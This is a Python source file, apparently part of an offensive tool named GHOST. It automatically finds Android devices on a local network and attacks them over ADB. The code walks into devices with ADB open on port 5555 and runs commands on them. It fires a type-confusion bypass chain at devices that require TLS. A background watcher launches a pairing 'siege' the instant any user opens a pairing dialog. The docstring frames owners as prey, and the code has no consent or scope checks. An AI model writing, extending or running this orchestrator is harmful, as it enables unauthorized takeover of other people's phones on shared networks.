"""
GHOST :: hunter.py — the engagement orchestrator (gate ⑦).

DOCTRINE: sweep → triage → strike → enroll → watch → strike again.
Zero human latency between "door opens" and "attack begins."

We strike DOORS, not walls — that's physics, not mercy. Every Android
version has a weakness, but the weakness is never magic: it is a STATE.

    OPEN_ADB          legacy tcpip 5555 left open          → walk in
    PAIRING_DIALOG    mDNS pairing service LIVE right now  → auto-siege
    STLS              ADB demanding TLS upgrade            → type-confusion chain
    GATED             RSA-auth daemon, no dialog           → watch; strike on dialog
    DORMANT           nothing answering                    → watch for state change

The watcher is the predator's patience: every few seconds it listens for
the `_adb-tls-pairing` announcement. The instant ANY phone on the LAN
opens its pairing dialog, the siege fires before the human's thumb leaves
the toggle. Prey attacks itself by opening the menu.

Honest scope: everything here rides the EXISTING proven engines
(full_sweep triage, the siege, the connect/bypass chains). The Hunter adds
command and control — no new attack code, just the general.
"""

import threading
import time
from collections import deque
from datetime import datetime, timezone

from ghost.discovery import full_sweep, discover_mdns
from ghost import pipeline as gp


def _now():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


class Hunter:
    """One general, one war. Arm → it hunts. Stand down → it sleeps."""

    def __init__(self):
        self._lock = threading.Lock()
        self._armed = False
        self._stop = threading.Event()
        self._watch_thread = None
        self._known_pairing = set()       # dialogs already engaged this arm
        self._log = deque(maxlen=300)
        self._last_triage = []            # classified targets from last sweep
        self._engaged = {}                # ip -> last engagement result
        self._cycles = 0
        self._note("Hunter initialized. Standing by.", "SYS")

    # ------------------------------------------------------------------ log
    def _note(self, msg, level="INFO"):
        with self._lock:
            self._log.append({"ts": _now(), "level": level, "msg": msg})

    # --------------------------------------------------------------- triage
    @staticmethod
    def _classify(t):
        if t.get("pairing_dialog_open"):
            return "PAIRING_DIALOG"
        v = (t.get("verdict") or "").upper()
        if v == "OPEN":
            return "OPEN_ADB"
        if v == "STLS":
            return "STLS"
        if v == "AUTH":
            return "GATED"
        return "DORMANT"

    def sweep_and_triage(self, mdns_window=6.0):
        """One full ear+wire sweep, classified. No strikes — pure intel."""
        sweep = full_sweep(mdns_window=mdns_window)
        triage = []
        for t in sweep.get("targets", []):
            triage.append({**t, "class": self._classify(t)})
        with self._lock:
            self._last_triage = triage
        counts = {}
        for t in triage:
            counts[t["class"]] = counts.get(t["class"], 0) + 1
        self._note(f"sweep: {len(triage)} targets — {counts}")
        return triage, sweep.get("pairing_services", [])

    # -------------------------------------------------------------- engage
    def engage(self, ip, port=None):
        """Strike ONE target through its best available vector."""
        # find the pairing port if a dialog is live on this ip
        pport = None
        try:
            mdns = discover_mdns(window=2.5)
            for rec in mdns.get("pairing", []):
                if rec.get("ip") == ip:
                    pport = int(rec.get("port"))
                    break
        except Exception:
            pass

        result = {"ip": ip, "ts": _now()}
        if pport:
            ok, payload = gp.start_siege(ip, pport, preset=None)
            result.update({"vector": "PAIRING_SIEGE", "port": pport,
                           "success": ok, "detail": payload})
            self._note(f"STRIKE {ip}: pairing dialog LIVE on :{pport} — "
                       + ("siege launched" if ok
                          else f"refused: {payload.get('error')}"),
                       "STRIKE" if ok else "WARN")
        else:
            banner = gp.probe_adb_banner(ip, port or 5555, timeout=4)
            if banner.get("is_adb") and banner.get("open_cnxn"):
                outcome = gp._adb_connect_and_verify(
                    ip, port or 5555,
                    "id; getprop ro.product.model; "
                    "getprop ro.build.version.release")
                result.update({"vector": "OPEN_ADB", "port": port or 5555,
                               "success": outcome.get("device_online"),
                               "detail": outcome})
                self._note(f"STRIKE {ip}: OPEN_ADB walk-in — "
                           f"online={outcome.get('device_online')}",
                           "STRIKE" if outcome.get("device_online") else "WARN")
            elif banner.get("is_adb") and banner.get("tls_required"):
                outcome = gp._cve_bypass_chain(ip, port or 5555,
                                               "id; getprop ro.product.model")
                result.update({"vector": "STLS", "port": port or 5555,
                               "success": bool(outcome.get("success")),
                               "detail": {"log": outcome.get("log"),
                                          "success": outcome.get("success")}})
                self._note(f"STRIKE {ip}: STLS type-confusion chain — "
                           f"success={outcome.get('success')}",
                           "STRIKE" if outcome.get("success") else "INFO")
            elif banner.get("is_adb") and banner.get("auth_required"):
                result.update({"vector": "GATED", "port": port or 5555,
                               "success": False,
                               "detail": {"note": "RSA gate — no dialog open; "
                                                   "watcher will strike when "
                                                   "the dialog opens"}})
                self._note(f"{ip}: ADB gated (RSA), dialog closed — watching",
                           "INFO")
            else:
                result.update({"vector": "DORMANT", "success": False,
                               "detail": {"note": "nothing answering"}})
                self._note(f"{ip}: dormant — nothing answered the knock",
                           "INFO")
        with self._lock:
            self._engaged[ip] = result
        return result

    # -------------------------------------------------------------- watcher
    def _watch_loop(self):
        """The predator's patience: poll mDNS for LIVE pairing dialogs.

        A new `_adb-tls-pairing` announcement = a human just opened the
        dialog = strike instantly. Cheap light polls (2.5s window) so the
        network barely notices us.
        """
        while not self._stop.is_set():
            try:
                mdns = discover_mdns(window=2.5)
                live = {r["ip"]: int(r["port"])
                        for r in mdns.get("pairing", []) if r.get("ip")}
                for ip, pport in live.items():
                    if ip in self._known_pairing:
                        continue
                    self._known_pairing.add(ip)
                    self._note(f"WATCHER: NEW pairing dialog {ip}:{pport} — "
                               "striking", "ALERT")
                    try:
                        self.engage(ip, pport)
                    except Exception as exc:      # never die angry
                        self._note(f"watcher strike {ip} failed: {exc!r}",
                                   "ERROR")
                with self._lock:
                    self._cycles += 1
            except Exception as exc:
                self._note(f"watcher cycle error: {exc!r}", "ERROR")
            self._stop.wait(4.0)
        self._note("watcher loop exited", "SYS")

    # ------------------------------------------------------------ arm/stop
    def arm(self):
        with self._lock:
            if self._armed:
                return {"success": True, "armed": True,
                        "note": "already armed", "known_pairing":
                            sorted(self._known_pairing)}
            self._armed = True
            self._stop.clear()
            self._watch_thread = threading.Thread(
                target=self._watch_loop, daemon=True, name="hunter-watcher")
            self._watch_thread.start()
        self._note("HUNTER ARMED — watching for pairing dialogs", "SYS")
        return {"success": True, "armed": True,
                "note": "watcher live: strikes on new pairing dialogs; "
                        "manual /hunter/sweep for full triage"}

    def standdown(self):
        with self._lock:
            self._armed = False
        self._stop.set()
        try:
            gp._SIEGE_LOCK.acquire()
            if gp._SIEGE.get("running"):
                gp._SIEGE["abort"] = True
        finally:
            gp._SIEGE_LOCK.release()
        self._note("HUNTER STOOD DOWN — siege abort signaled", "SYS")
        return {"success": True, "armed": False,
                "note": "watcher stopped, siege abort signaled"}

    # -------------------------------------------------------------- status
    def status(self):
        with self._lock:
            log_tail = list(self._log)[-40:]
            triage = list(self._last_triage)
            engaged = dict(self._engaged)
            armed, cycles = self._armed, self._cycles
        siege = {k: gp._SIEGE.get(k) for k in
                 ("running", "status", "tried", "paired", "ip", "port")}
        return {"armed": armed, "watch_cycles": cycles,
                "siege": siege,
                "targets": triage,
                "engaged": engaged,
                "log": log_tail}


HUNTER = Hunter()
